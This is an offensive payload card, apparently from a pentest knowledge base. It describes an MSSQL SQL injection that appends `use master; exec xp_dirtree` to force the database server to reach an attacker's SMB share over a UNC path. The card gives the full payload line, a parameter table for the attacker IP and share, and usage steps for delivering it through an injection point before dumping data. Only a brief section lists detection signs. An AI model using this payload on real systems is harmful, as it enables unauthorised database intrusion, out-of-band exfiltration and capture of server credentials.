---
id: 1d13406b-abfb-4476-aa0f-112b423c0137
name: mssql-sqli-xp-dirtree-remote-share
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.040338+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - SQL Server
tags:
  - mssql-injection
  - unc-path
  - exfiltration
validated: true
---

# mssql-sqli-xp-dirtree-remote-share

## Code

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

## Description

This SQL injection payload executes xp_dirtree to enumerate a remote SMB share via UNC path, switching to the master database to ensure extended proc availability and commenting out trailing query parts to avoid syntax errors.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `10.10.15.XX` | Attacker's IP hosting the SMB share | 192.168.1.100 |
| `SHARE` | Name of the SMB share | public |

## Usage

Deliver this payload through a SQL injection point (e.g., via sqlmap or manual POST request) after confirming blind SQLi or union-based access. Use it as the first step to verify outbound SMB from the target SQL Server before proceeding to data dumps.

## Detection

- SQL Server error logs showing xp_dirtree executions with UNC paths.
- Network logs indicating outbound SMB connections from database servers to unusual IPs.
- Application logs for injection attempts with 'use master; exec' patterns.

## Related

- [[procedures/MSSQL-UNC-Path-Out-of-Band-Data-Retrieval]]
- [[commands/mssql-xp-dirtree-enumerate-unc-path]]
